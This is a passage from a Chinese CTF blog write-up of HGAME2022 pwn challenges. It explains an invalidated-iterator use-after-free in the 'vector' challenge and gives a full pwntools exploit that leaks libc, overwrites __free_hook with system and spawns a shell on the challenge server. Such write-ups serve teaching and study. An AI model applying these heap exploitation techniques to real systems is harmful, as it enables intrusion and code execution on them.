class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xf8</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week4">week4</h2>
<h3 id="vector">vector</h3>
<h4 id="思路-6">思路</h4>
<p>​    libc 版本 2.31</p>
<img src="/HGAME2022-Pwn-wp/image-20220215200343706.png" class="">
<p>​    <code>move_note</code> 函数中存在 <code>vector</code> 迭代器失效的漏洞，<code>vector</code> 的 <code>resize</code> 操作会改变容器容量，进行扩容时会重新分配内存，那么指向容器的迭代器、指针和引用都会失效，而下面移动的操作会使用已经失效的迭代器，存在 UAF</p>
<img src="/HGAME2022-Pwn-wp/image-20220215222352049.png" class="">
<img src="/HGAME2022-Pwn-wp/image-20220215200657646.png" class="">
<p>​    通过调试可以发现在 <code>move_note</code> 扩容后可以把失效迭代器中的值复制到要 <code>move</code> 到的地方，这样就可以实现 <code>double free</code>，为了绕过 key 检测还是使用 <code>tcache stashing</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcache stashing</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">12</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x70</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x70</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
<img src="/HGAME2022-Pwn-wp/image-20220215203411422.png" class="">
<p>​     为了 leak libc 基址要先 <code>malloc</code> 一个较大的堆块，然后 <code>free</code> 进入 <code>unsorted bin</code> 。这时再申请一个较小的堆块，那么 <code>unsorted bin</code> 就会被切割，切割出来的块内有指向 <code>main_arena</code> 内部的指针，就可以得到 libc 基址</p>
<p>​    <a target="_blank" rel="noopener" href="https://10-0-0-55.github.io/pwn/unsorted-bin/#leak-heap-libc">https://10-0-0-55.github.io/pwn/unsorted-bin/#leak-heap-libc</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):         </span><br><span class="line">    add(i, <span class="number">0xf0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)                   <span class="comment">#得到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)      <span class="comment">#切割 unsorted bin</span></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
<h4 id="exp-6">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./vector&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">53088</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./vector&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):         </span><br><span class="line">    add(i, <span class="number">0xf0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)                   <span class="comment">#得到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)      <span class="comment">#切割 unsorted bin</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">336</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">14</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">move(<span class="number">20</span>)                    <span class="comment">#UAF</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">13</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache stashing</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">12</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x70</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x70</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>HGAME2022 Pwn wp</p><p><a href="https://www.0wl.site/HGAME2022-Pwn-wp/">https://www.0wl.site/HGAME2022-Pwn-wp/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>0wl</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-02-18</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-02-22</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/wp/">wp</a><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_telegram"></a><a class="a2a_button_whatsapp"></a><a class="a2a_button_reddit"></a></div><script src="https://static.addtoany.com/menu/page.js" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a></div></div></div><div class="card"><nav class="post-navigation mt-4 level is-mobile card-content"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/BUU-ciscn-2019-n-7/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">BUU-ciscn_2019_n_7</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/"><span class="level-item">ByteCTF2021决赛re writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav></div><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content twikoo" id="twikoo"></div><script src="https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js"></script><script>twikoo.init({
      envId: 'blog-9gu02qis60845ab5'
    });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.jpg" alt="0wl"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">0wl</p><p class="is-size-6 is-block">HDU / CTFer / Re</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Hangzhou, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">19</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">13</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/0wl-alt" target="_blank" rel="noopener" id="widget-follow">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/0wl-alt"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#week1"><span class="level-left"><span class="level-item">week1</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#enter-the-pwn-land"><span class="level-left"><span class="level-item">enter_the_pwn_land</span></span></a></li><li><a class="level is-mobile" href="#enter-the-evil-pwn-land"><span class="level-left"><span class="level-item">enter_the_evil_pwn_land</span></span></a></li><li><a class="level is-mobile" href="#oldfashion-orw"><span class="level-left"><span class="level-item">oldfashion_orw</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#exp"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ser-per-fa"><span class="level-left"><span class="level-item">ser_per_fa</span></span></a></li></ul></li><li><a class="level is-mobile" href="#week2"><span class="level-left"><span class="level-item">week2</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#blind"><span class="level-left"><span class="level-item">blind</span></span></a></li><li><a class="level is-mobile" href="#echo-sever"><span class="level-left"><span class="level-item">echo_sever</span></span></a></li><li><a class="level is-mobile" href="#oldfashion-note"><span class="level-left"><span class="level-item">oldfashion_note</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路-2"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#tcache相关"><span class="level-left"><span class="level-item">tcache相关</span></span></a></li><li><a class="level is-mobile" href="#Unsorted-bin-leak"><span class="level-left"><span class="level-item">Unsorted bin leak</span></span></a></li><li><a class="level is-mobile" href="#fast-bin-attack"><span class="level-left"><span class="level-item">fast bin attack</span></span></a></li><li><a class="level is-mobile" href="#exp-2"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#week3"><span class="level-left"><span class="level-item">week3</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#changeable-note"><span class="level-left"><span class="level-item">changeable_note</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路-3"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#exp-3"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li><li><a class="level is-mobile" href="#elder-note"><span class="level-left"><span class="level-item">elder_note</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路-4"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#exp-4"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sized-note"><span class="level-left"><span class="level-item">sized_note</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路-5"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#chunk-overlapping"><span class="level-left"><span class="level-item">chunk overlapping</span></span></a></li><li><a class="level is-mobile" href="#exp-5"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#week4"><span class="level-left"><span class="level-item">week4</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#vector"><span class="level-left"><span class="level-item">vector</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#思路-6"><span class="level-left"><span class="level-item">思路</span></span></a></li><li><a class="level is-mobile" href="#exp-6"><span class="level-left"><span class="level-item">exp</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/MFC/"><span class="tag">MFC</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hgame/"><span class="tag">hgame</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/idapython/"><span class="tag">idapython</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/re/"><span class="tag">re</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/riscv/"><span class="tag">riscv</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ruby/"><span class="tag">ruby</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/upx/"><span class="tag">upx</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/wp/"><span class="tag">wp</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"><span class="tag">反调试</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img class="logo-img" src="/" alt="0wl’s Blog" height="28"><img class="logo-img-dark" src="/" alt="0wl’s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2022 0wl</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/imaegoo/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script>if (typeof 0 !== 'undefined' 
            && true == true) {
            $(document).ready(function () {
                var int = setInterval(fixCount, 100);
                var busuanziSiteOffset = parseInt(0);
                function fixCount() {
                    if ($("#busuanzi_container_site_uv").css("display") != "none" && parseInt($("#busuanzi_value_site_uv").html()) > 0) {
                        clearInterval(int);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziSiteOffset);
                    }
                }
            });
        }</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用 Cookie，以启用评论系统和分析功能。",
          dismiss: "知道了",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><div class="searchbox-pinyin"><label class="checkbox"><input id="search-by-pinyin" type="checkbox" checked="checked"><span> 拼音检索</span></label></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/imaegoo/pinyin.js" defer></script><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script type="text/javascript" src="/js/imaegoo/imaegoo.js"></script><script type="text/javascript" src="/js/imaegoo/universe.js"></script><script type="text/javascript" src="/js/live2d/autoload.js"></script></body></html>